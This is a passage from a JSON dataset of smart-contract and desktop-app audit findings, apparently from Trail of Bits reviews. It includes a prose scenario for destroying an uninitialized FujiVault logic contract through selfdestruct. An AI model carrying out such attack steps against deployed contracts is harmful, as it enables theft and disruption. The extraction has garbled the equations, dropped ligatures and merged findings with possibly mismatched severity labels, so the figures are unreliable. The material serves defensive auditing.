        ]
    },
    {
        "title": "6. Vulnerable dependencies ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The Subspace Desktop Tauri application uses vulnerable Rust and Node dependencies, as reported by the cargo audit and yarn audit tools. Among the Rust crates used in the Tauri application, two are vulnerable, three are unmaintained, and six are yanked. The table below summarizes the ndings: Crate Version in Use Finding Latest Safe Version owning_ref 0.4.1 Memory corruption vulnerability ( RUSTSEC-2022-0040 ) Not available time 0.1.43 Memory corruption vulnerability ( RUSTSEC-2020-0071 ) 0.2.23 and newer ansi_term 0.12.1 dotenv 0.15.0 xml-rs 0.8.4 Unmaintained crate ( RUSTSEC-2021-0139 ) Unmaintained crate ( RUSTSEC-2021-0141 ) Unmaintained crate ( RUSTSEC-2022-0048 ) blake2 0.10.2 Yanked crate block-buffer 0.10.0 Yanked crate cpufeatures 0.2.1 Yanked crate iana-time-zone 0.1.44 Yanked crate Multiple alternatives dotenvy quick-xml 0.10.4 0.10.3 0.2.5 0.1.50 sp-version 5.0. For the Node dependencies used in the Tauri application, one is vulnerable to a high-severity issue and another is vulnerable to a moderate-severity issue. These vulnerable dependencies appear to be used only in the development dependencies. Package Finding Latest Safe Version got CVE-2022-33987 (Moderate severity) 11.8.5 and newer git-clone CVE-2022-25900 (High severity) Not available Exploit Scenario An attacker nds a way to exploit a known memory corruption vulnerability in one of the dependencies reported above and takes control of the application. Recommendations Short term, update the dependencies to their newest possible versions. Work with the library authors to update the indirect dependencies. Monitor the development of the x for owning_ref and upgrade it as soon as a safe version of the crate becomes available. Long term, run cargo audit and yarn audit regularly. Include cargo audit and yarn audit in the projects CI/CD pipeline to ensure that the team is aware of new vulnerabilities in the dependencies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Broken error reporting link ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The create_full_client function calls the sp_panic_handler::set() function to set a URL for a Discord invitation; however, this invitation is broken. The documentation for the sp_panic_handler::set() function states that The bug_url parameter is an invitation for users to visit that URL to submit a bug report in the case where a panic happens. Because the link is broken, users cannot submit bug reports. sp_panic_handler::set( \" https://discord.gg/vhKF9w3x \" , env! ( \"SUBSTRATE_CLI_IMPL_VERSION\" ), ); Figure 7.1: subspace-desktop/src-tauri/src/node.rs#L169-L172 Exploit Scenario A user encounters a crash of Subspace Desktop and is presented with a broken link with which to report the error. The user is unable to report the error. Recommendations Short term, update the bug report link to the correct Discord invitation. Long term, use a URL on a domain controlled by Subspace Network as the bug reporting URL. This will allow Subspace Network developers to make adjustments to the reporting URL without pushing application updates. 8. Side e\u0000ects are triggered regardless of disk_farms validity Severity: Informational Diculty: High Type: Data Validation Finding ID: TOB-SPDF-8 Target: src-tauri/src/farmer.rs#L118-L192",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Network conguration path construction is duplicated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2022-09-subspacenetwork-subspacenetworkdesktopfarmer-securityreview.pdf",
        "description": "The create_full_client function contains code that uses hard-coded strings to indicate conguration paths (gure 9.1) in place of the previously dened DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values, which are used in the other parts of the code. This is a risky coding pattern, as a Subspace developer who is updating the DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE values may forget to also update the equivalent values used in the create_full_client function. if primary_chain_node.client.info().best_number == 33670 { if let Some (config_dir) = config_dir { let workaround_file = config_dir.join( \"network\" ).join( \"gemini_1b_workaround\" ); if !workaround_file.exists() { let _ = std::fs::write(workaround_file, &[]); let _ = std::fs::remove_file( config_dir.join( \"network\" ).join( \"secret_ed25519\" ) ); return Err (anyhow!( \"Applied workaround for upgrade from gemini-1b-2022-jun-08, \\ please restart this node\" )); } } } Figure 9.1: subspace-desktop/src-tauri/src/node.rs#L207-L219 Recommendations Short term, update the code in gure 9.1 to use DEFAULT_NETWORK_CONFIG_PATH and NODE_KEY_ED25519_FILE rather than the hard-coded values. This will make eventual updates to these paths less error prone.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Missing negative tests for several assertions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/ParallelFinance3.pdf",
        "description": "The Paraspace protocol consists of numerous interacting components, and each operation is validated by checks that are widely dispersed throughout the codebase. Therefore, a robust suite of negative test cases is necessary to prevent vulnerabilities from being introduced if developers unwittingly remove or alter checks during development. However, a number of checks are present in the codebase without corresponding test cases. For example, the health factor check in the FlashClaimLogic contract is required in order to prevent users from extracting collateralized value from NFTs during ash claims, but there is no unit test to ensure this behavior. Commenting out the lines in gure 1.1 does not cause any test to fail. require( 86 87 88 89 ); healthFactor > DataTypes.HEALTH_FACTOR_LIQUIDATION_THRESHOLD, Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD Figure 1.1: FlashClaimLogic.sol#8689 A test that captures the desired behavior could, for example, initiate a ash claim of a BAYC NFT that is tied to collateralized staked APE (sAPE) and then withdraw the APE directly from the ApeCoinStaking contract, causing the accounts health factor to fall below 1. As another example, removing the following lines from the withdrawApeCoin function in the PoolApeStaking contract demonstrates that no negative test validates this functions logic. require( 73 74 75 76 ); nToken.ownerOf(_nfts[index].tokenId) == msg.sender, Errors.NOT_THE_OWNER Figure 1.2: PoolApeStaking.sol#73 Exploit Scenario Alice, a Paraspace developer, refactors the FlashClaimLogic contract and mistakenly omits the health factor check. Expecting the test suite to catch such errors, she commits the code, and the new version of the Paraspace contracts becomes vulnerable to undercollateralization attacks. Recommendations Short term, for each require statement in the codebase, ensure that at least one unit test fails when the assertion is removed. Long term, consider requiring that Paraspace developers ensure a minimum amount of unit test code coverage when they submit new pull requests to the Paraspace contracts, and that they provide justication for uncovered conditions. 2. Use of a magic constant with unclear meaning for the sAPE unstaking incentive Severity: Informational Diculty: High Type: Conguration Finding ID: TOB-PARASPACE-2 Target: contracts/protocol/tokenization/NTokenApeStaking.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Anyone can destroy the FujiVault logic contract if its initialize function was not called during deployment ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Anyone can destroy the FujiVault logic contract if its initialize function has not already been called. Calling initialize on a logic contract is uncommon, as usually nothing is gained by doing so. The deployment script does not call initialize on any logic contract. As a result, the exploit scenario detailed below is possible after deployment. This issue is similar to a bug in AAVE that found in 2020. OpenZeppelins hardhat-upgrades plug-in protects against this issue by disallowing the use of selfdestruct or delegatecall on logic contracts. However, the Fuji Protocol team has explicitly worked around these protections by calling delegatecall in assembly, which the plug-in does not detect. Exploit Scenario The Fuji contracts are deployed, but the initialize functions of the logic contracts are not called. Bob, an attacker, deploys a contract to the address alwaysSelfdestructs, which simply always executes the selfdestruct opcode. Additionally, Bob deploys a contract to the address alwaysSucceeds, which simply never reverts. Bob calls initialize on the FujiVault logic contract, thereby becoming its owner. To make the call succeed, Bob passes 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE as the value for the _collateralAsset and _borrowAsset parameters. He then calls FujiVaultLogic.setActiveProvider(alwaysSelfdestructs), followed by FujiVault.setFujiERC1155(alwaysSucceeds) to prevent an additional revert in the next and nal call. Finally, Bob calls FujiVault.deposit(1), sending 1 wei. This triggers a delegatecall to alwaysSelfdestructs, thereby destroying the FujiVault logic contract and making the protocol unusable until its proxy contract is upgraded. 14 Fuji Protocol Because OpenZeppelins upgradeable contracts do not check for a contracts existence before a delegatecall (TOB-FUJI-003), all calls to the FujiVault proxy contract now succeed. This leads to exploits in any protocol integrating the Fuji Protocol. For example, a call that should repay all debt will now succeed even if no debt is repaid. Recommendations Short term, do not use delegatecall to implement providers. See TOB-FUJI-002 for more information. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 15 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "2. Providers are implemented with delegatecall ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The system uses delegatecall to execute an active provider's code on a FujiVault, making the FujiVault the holder of the positions in the borrowing protocol. However, delegatecall is generally error-prone, and the use of it introduced the high-severity nding TOB-FUJI-001. It is possible to make a FujiVault the holder of the positions in a borrowing protocol without using delegatecall. Most borrowing protocols include a parameter that species the receiver of tokens that represent a position. For borrowing protocols that do not include this type of parameter, tokens can be transferred to the FujiVault explicitly after they are received from the borrowing protocol; additionally, the tokens can be transferred from the FujiVault to the provider before they are sent to the borrowing protocol. These solutions are conceptually simpler than and preferred to the current solution. Recommendations Short term, implement providers without the use of delegatecall. Set the receiver parameters to the FujiVault, or transfer the tokens corresponding to the position to the FujiVault. Long term, avoid the use of delegatecall, as it is dicult to use correctly and can introduce vulnerabilities that are hard to detect. 16 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "3. Lack of contract existence check on delegatecall will result in unexpected behavior ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The VaultControlUpgradeable and Proxy contracts use the delegatecall proxy pattern. If the implementation contract is incorrectly set or self-destructed, the contract may not be able to detect failed executions. The VaultControlUpgradeable contract includes the _execute function, which users can invoke indirectly to execute a transaction to a _target address. This function does not check for contract existence before executing the delegatecall (gure 3.1). /** * @dev Returns byte response of delegatcalls */ function _execute(address _target, bytes memory _data) internal whenNotPaused returns (bytes memory response) { /* solhint-disable */ assembly { let succeeded := delegatecall(sub(gas(), 5000), _target, add(_data, 0x20), mload(_data), 0, 0) let size := returndatasize() response := mload(0x40) mstore(0x40, add(response, and(add(add(size, 0x20), 0x1f), not(0x1f)))) mstore(response, size) returndatacopy(add(response, 0x20), 0, size) switch iszero(succeeded) case 1 { // throw if delegatecall failed revert(add(response, 0x20), size) } } /* solhint-disable */ } 17 Fuji Protocol Figure 3.1: fuji-protocol/contracts/abstracts/vault/VaultBaseUpgradeable.sol#L93-L11 5 The Proxy contract, deployed by the @openzeppelin/hardhat-upgrades library, includes a payable fallback function that invokes the _delegate function when proxy calls are executed. This function is also missing a contract existence check (gure 3.2). /** * @dev Delegates the current call to `implementation`. * * This function does not return to its internall call site, it will return directly to the external caller. */ function _delegate(address implementation) internal virtual { // solhint-disable-next-line no-inline-assembly assembly { // Copy msg.data. We take full control of memory in this inline assembly // block because it will not return to Solidity code. We overwrite the // Solidity scratch pad at memory position 0. calldatacopy(0, 0, calldatasize()) // Call the implementation. // out and outsize are 0 because we don't know the size yet. let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0) // Copy the returned data. returndatacopy(0, 0, returndatasize()) switch result // delegatecall returns 0 on error. case 0 { revert(0, returndatasize()) } default { return(0, returndatasize()) } } } Figure 3.2: Proxy.sol#L16-L41 A delegatecall to a destructed contract will return success (gure 3.3). Due to the lack of contract existence checks, a series of batched transactions may appear to be successful even if one of the transactions fails. The low-level functions call, delegatecall and staticcall return true as their first return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 3.3: A snippet of the Solidity documentation detailing unexpected behavior related to delegatecall Exploit Scenario Eve upgrades the proxy to point to an incorrect new implementation. As a result, each 18 Fuji Protocol delegatecall returns success without changing the state or executing code. Eve uses this to scam users. Recommendations Short term, implement a contract existence check before any delegatecall. Document the fact that suicide and selfdestruct can lead to unexpected behavior, and prevent future upgrades from using these functions. Long term, carefully review the Solidity documentation, especially the Warnings section, and the pitfalls of using the delegatecall proxy pattern. References  Contract Upgrade Anti-Patterns  Breaking Aave Upgradeability 19 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. FujiVault.setFactor is unnecessarily complex and does not properly handle invalid input ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The FujiVault contracts setFactor function sets one of four state variables to a given value. Which state variable is set depends on the value of a string parameter. If an invalid value is passed, setFactor succeeds but does not set any of the state variables. This creates edge cases, makes writing correct code more dicult, and increases the likelihood of bugs. function setFactor( uint64 _newFactorA, uint64 _newFactorB, string calldata _type ) external isAuthorized { bytes32 typeHash = keccak256(abi.encode(_type)); if (typeHash == keccak256(abi.encode(\"collatF\"))) { collatF.a = _newFactorA; collatF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"safetyF\"))) { safetyF.a = _newFactorA; safetyF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"bonusLiqF\"))) { bonusLiqF.a = _newFactorA; bonusLiqF.b = _newFactorB; } else if (typeHash == keccak256(abi.encode(\"protocolFee\"))) { protocolFee.a = _newFactorA; protocolFee.b = _newFactorB; } } Figure 4.1: FujiVault.sol#L475-494 Exploit Scenario A developer on the Fuji Protocol team calls setFactor from another contract. He passes a type that is not handled by setFactor. As a result, code that is expected to set a state variable does nothing, resulting in a more severe vulnerability. 20 Fuji Protocol Recommendations Short term, replace setFactor with four separate functions, each of which sets one of the four state variables. Long term, avoid string constants that simulate enumerations, as they cannot be checked by the typechecker. Instead, use enums and ensure that any code that depends on enum values handles all possible values. 21 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "5. Preconditions specied in docstrings are not checked by functions ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The docstrings of several functions specify preconditions that the functions do not automatically check for. For example, the docstring of the FujiVault contracts setFactor function contains the preconditions shown in gure 5.1, but the functions body does not contain the corresponding checks shown in gure 5.2. * For safetyF; Sets Safety Factor of Vault, should be > 1, a/b * For collatF; Sets Collateral Factor of Vault, should be > 1, a/b Figure 5.1: FujiVault.sol#L469-470 require(safetyF.a > safetyF.b); ... require(collatF.a > collatF.b); Figure 5.2: The checks that are missing from FujiVault.setFactor Additionally, the docstring of the Controller contracts doRefinancing function contains the preconditions shown in gure 5.3, but the functions body does not contain the corresponding checks shown in gure 5.4. * @param _ratioB: _ratioA/_ratioB <= 1, and > 0 Figure 5.3: Controller.sol#L41 require(ratioA > 0 && ratioB > 0); require(ratioA <= ratioB); Figure 5.4: The checks that are missing from Controller.doRefinancing Exploit Scenario The setFactor function is called with values that violate its documented preconditions. Because the function does not check for these preconditions, unexpected behavior occurs. 22 Fuji Protocol Recommendations Short term, add checks for preconditions to all functions with preconditions specied in their docstrings. Long term, ensure that all documentation and code are in sync. 23 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "6. The FujiERC1155.burnBatch function implementation is incorrect ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The FujiERC1155 contracts burnBatch function deducts the unscaled amount from the user's balance and from the total supply of an asset. If the liquidity index of an asset (index[assetId]) is dierent from its initialized value, the execution of burnBatch could result in unintended arithmetic calculations. Instead of deducting the amount value, the function should deduct the amountScaled value. function burnBatch( address _account, uint256[] memory _ids, uint256[] memory _amounts ) external onlyPermit { require(_account != address(0), Errors.VL_ZERO_ADDR_1155); require(_ids.length == _amounts.length, Errors.VL_INPUT_ERROR); address operator = _msgSender(); uint256 accountBalance; uint256 assetTotalBalance; uint256 amountScaled; for (uint256 i = 0; i < _ids.length; i++) { uint256 amount = _amounts[i]; accountBalance = _balances[_ids[i]][_account]; assetTotalBalance = _totalSupply[_ids[i]]; amountScaled = _amounts[i].rayDiv(indexes[_ids[i]]); require(amountScaled != 0 && accountBalance >= amountScaled, Errors.VL_INVALID_BURN_AMOUNT); _balances[_ids[i]][_account] = accountBalance - amount; _totalSupply[_ids[i]] = assetTotalBalance - amount; } emit TransferBatch(operator, _account, address(0), _ids, _amounts); } Figure 6.1: FujiERC1155.sol#L218-247 24 Fuji Protocol Exploit Scenario The burnBatch function is called with an asset for which the liquidity index is dierent from its initialized value. Because amount was used instead of amountScaled, unexpected behavior occurs. Recommendations Short term, revise the burnBatch function so that it uses amountScaled instead of amount when updating a users balance and the total supply of an asset. Long term, use the burn function in the burnBatch function to keep functionality consistent. 25 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "7. Error in the white papers equation for the cost of renancing ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The white paper uses the following equation (equation 4) to describe how the cost of renancing is calculated:    =  +   +   +   +     is the amount of debt to be renanced and is a summand of the equation. This is incorrect, as it implies that the renancing cost is always greater than the amount of debt to be renanced. A correct version of the equation could be   is an amount, or     =  +    +  +  +   = +   +   *      , in which  is a  , in which  percentage. Recommendations Short term, x equation 4 in the white paper. Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 26 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "8. Errors in the white papers equation for index calculation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The white paper uses the following equation (equation 1) to describe how the index for a given token at timestamp is calculated:    =  1 + ( 1 )/    1  is the amount of the given token that the Fuji Protocol owes the provider (the borrowing  protocol) at timestamp . The index is updated only when the balance changes through the accrual of interest, not when the balance changes through borrowing or repayment operations. This means that    is always negative, which is incorrect, as  should calculate the )/    ( 1 1 1 interest rate since the last index update. *  3 *  2 * ... *  . A user's current balance is computed by taking the users initial stored  The index represents the total interest rate since the deployment of the protocol. It is the product of the various interest rates accrued on the active providers during the lifetime of the protocol (measured only during state-changing interactions with the provider):  1 balance, multiplying it by the current index, and dividing it by the index at the time of the creation of that user's position. The division operation ensures that the user will not owe interest that accrued before the creation of the users position. The index provides an ecient way to keep track of interest rates without having to update each user's balance separately, which would be prohibitively expensive on Ethereum. However, interest is compounded through multiplication, not addition. The formula should use the product sign instead of the plus sign. 27 Fuji Protocol Exploit Scenario Alice decides to use the Fuji Protocol after reading the white paper. She later learns that calculations in the white paper do not match the implementations in the protocol. Because Alice allocated her funds based on her understanding of the specication, she loses funds. Recommendations Short term, replace equation 1 in the white paper with a correct and simplied version. For more information on the simplied version, see nding TOB-FUJI-015.   =  1 / *   1 Long term, ensure that the equations in the white paper are correct and in sync with the implementation. 28 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "9. FujiERC1155.setURI does not adhere to the EIP-1155 specication ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The FujiERC1155 contracts setURI function does not emit the URI event. /** * @dev Sets a new URI for all token types, by relying on the token type ID */ function setURI(string memory _newUri) public onlyOwner { _uri = _newUri; } Figure 9.1: FujiERC1155.sol#L266-268 This behavior does not adhere to the EIP-1155 specication, which states the following: Changes to the URI MUST emit the URI event if the change can be expressed with an event (i.e. it isnt dynamic/programmatic). Figure 9.2: A snippet of the EIP-1155 specication Recommendations Short term, revise the setURI function so that it emits the URI event. Long term, review the EIP-1155 specication to verify that the contracts adhere to the standard. References  EIP-1155 29 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "10. Partial renancing operations can break the protocol ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The white paper documents the Controller contracts ability to perform partial renancing operations. These operations move only a fraction of debt and collateral from one provider to another to prevent unprotable interest rate slippage. However, the protocol does not correctly support partial renancing situations in which debt and collateral are spread across multiple providers. For example, payback and withdrawal operations always interact with the current provider, which might not contain enough funds to execute these operations. Additionally, the interest rate indexes are computed only from the debt owed to the current provider, which might not accurately reect the interest rate across all providers. Exploit Scenario An executor performs a partial renancing operation. Interest rates are computed incorrectly, resulting in a loss of funds for either the users or the protocol. Recommendations Short term, disable partial renancing until the protocol supports it in all situations. Long term, ensure that functionality that is not fully supported by the protocol cannot be used by accident. 30 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "11. Native support for ether increases the codebases complexity ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The protocol supports ERC20 tokens and Ethereums native currency, ether. Ether transfers follow dierent semantics than token transfers. As a result, many functions contain extra code, like the code shown in gure 11.1, to handle ether transfers. if (vAssets.borrowAsset == ETH) { require(msg.value >= amountToPayback, Errors.VL_AMOUNT_ERROR); if (msg.value > amountToPayback) { IERC20Upgradeable(vAssets.borrowAsset).univTransfer( payable(msg.sender), msg.value - amountToPayback ); } } else { // Check User Allowance require( IERC20Upgradeable(vAssets.borrowAsset).allowance(msg.sender, address(this)) >= amountToPayback, Errors.VL_MISSING_ERC20_ALLOWANCE ); Figure 11.1: FujiVault.sol#L319-333 This extra code increases the codebases complexity. Furthermore, functions will behave dierently depending on their arguments. Recommendations Short term, replace native support for ether with support for ERC20 WETH. This will decrease the complexity of the protocol and the likelihood of bugs. 31 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "12. Missing events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol 13. Indexes are not updated before all operations that require up-to-date indexes Severity: High Diculty: Low Type: Undened Behavior Finding ID: TOB-FUJI-013 Target: FujiVault.sol, FujiERC1155.sol, FLiquidator.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "14. No protection against missing index updates before operations that depend on up-to-date indexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. This function must be called before all operations that read indexes (TOB-FUJI-013). However, the protocol does not protect against situations in which indexes are not updated before they are read; these situations could result in incorrect accounting. Exploit Scenario Developer Bob adds a new operation that reads indexes, but he forgets to add a call to updateF1155Balances. As a result, the new operation uses outdated index values, which causes incorrect accounting. Recommendations Short term, redesign the index calculations so that they provide protection against the reading of outdated indexes. For example, the index calculation process could keep track of the last index updates block number and access indexes exclusively through a getter, which updates the index automatically, if it has not already been updated for the current block. Since ERC-1155s balanceOf and totalSupply functions do not allow side eects, this solution would require the use of dierent functions internally. Long term, use defensive coding practices to ensure that critical operations are always executed when required. 34 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Formula for index calculation is unnecessarily complex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol 16. Flashers initiateFlashloan function does not revert on invalid ashnum values Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-FUJI-016 Target: Flasher.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "17. Docstrings do not reect functions implementations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The docstring of the FujiVault contracts withdraw function states the following: * @param _withdrawAmount: amount of collateral to withdraw * otherwise pass -1 to withdraw maximum amount possible of collateral (including safety factors) Figure 17.1: FujiVault.sol#L188-189 However, the maximum amount is withdrawn on any negative value, not only on a value of -1. A similar inconsistency between the docstring and the implementation exists in the FujiVault contracts payback function. Recommendations Short term, adjust the withdraw and payback functions docstrings or their implementations to make them match. Long term, ensure that docstrings always match the corresponding functions implementation. 38 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "18. Harvesters getHarvestTransaction function does not revert on invalid _farmProtocolNum and harvestType values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The Harvester contracts getHarvestTransaction function incorrectly returns claimedToken and transaction values of 0 if the _farmProtocolNum parameter is set to a value greater than 1 or if the harvestType value is set to value greater than 2. However, the function does not revert on invalid _farmProtocolNum and harvestType values. function getHarvestTransaction(uint256 _farmProtocolNum, bytes memory _data) external view override returns (address claimedToken, Transaction memory transaction) { if (_farmProtocolNum == 0) { transaction.to = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimComp(address)\")), msg.sender ); claimedToken = 0xc00e94Cb662C3520282E6f5717214004A7f26888; } else if (_farmProtocolNum == 1) { uint256 harvestType = abi.decode(_data, (uint256)); if (harvestType == 0) { // claim (, address[] memory assets) = abi.decode(_data, (uint256, address[])); transaction.to = 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimRewards(address[],uint256,address)\")), assets, type(uint256).max, msg.sender ); } else if (harvestType == 1) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; transaction.data = abi.encodeWithSelector(bytes4(keccak256(\"cooldown()\"))); } else if (harvestType == 2) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; 39 Fuji Protocol transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"redeem(address,uint256)\")), msg.sender, type(uint256).max ); claimedToken = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; } } } Figure 18.1: Harvester.sol#L13-54 Exploit Scenario Alice, an executor of the Fuji Protocol, calls getHarvestTransaction with the _farmProtocolNum parameter set to 2. As a result, rather than reverting, the function returns claimedToken and transaction values of 0. Recommendations Short term, revise getHarvestTransaction so that it reverts if it is called with invalid farmProtocolNum or harvestType values. Long term, ensure that all functions revert if they are called with invalid values. 40 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Lack of data validation in Controllers doRenancing function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "description": "The Controller contracts doRefinancing function does not check the _newProvider value. Therefore, the function accepts invalid values for the _newProvider parameter. function doRefinancing( address _vaultAddr, address _newProvider, uint256 _ratioA, uint256 _ratioB, uint8 _flashNum ) external isValidVault(_vaultAddr) onlyOwnerOrExecutor { IVault vault = IVault(_vaultAddr); [...] [...] IVault(_vaultAddr).setActiveProvider(_newProvider); } Figure 19.1: Controller.sol#L44-84 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller.doRefinancing with the _newProvider parameter set to the same address as the active provider. As a result, unnecessary ash loan fees will be paid. Recommendations Short term, revise the doRefinancing function so that it reverts if _newProvider is set to the same address as the active provider. Long term, ensure that all functions revert if they are called with invalid values. 41 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Lack of data validation on function parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
